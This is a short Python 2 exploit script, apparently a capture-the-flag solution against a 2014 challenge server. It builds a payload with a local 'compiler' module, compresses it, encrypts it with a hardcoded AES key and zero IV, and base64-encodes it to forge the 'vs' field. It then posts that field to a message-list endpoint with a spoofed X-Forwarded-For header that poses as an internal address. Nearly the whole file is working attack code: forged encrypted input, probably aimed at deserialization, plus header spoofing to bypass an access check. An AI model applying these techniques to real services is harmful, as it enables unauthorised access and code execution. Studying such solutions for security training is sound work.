import requests
import os,sys
import json
import pickle
from Crypto.Cipher import AES
import zlib
import base64
import sys
from compiler import compiler


def exploit():
	ret=compiler()
	return ret


key = "ab2f8913c6fde13596c09743a802ff7a".decode("hex")
iv = "\x00"*16

obj = AES.new(key, AES.MODE_CBC, iv)

before_zlib = exploit()
after_zlib = zlib.compress(before_zlib)
padlen=16-(len(after_zlib)%16)
after_zlib += padlen*chr(padlen)
after_aes = obj.encrypt(after_zlib)


vs = base64.b64encode(iv+after_aes)

data = {
	"vs": vs
}
headers = {
	"X-Forwarded-For":"10.0.1.200"
}
s = requests.Session()
r = s.post("http://nsc2014.synacktiv.com:65480/msg.list", data=data, headers=headers)

try:
	ret = json.loads(r.text)
	print ret["messages"]
except:
	pass
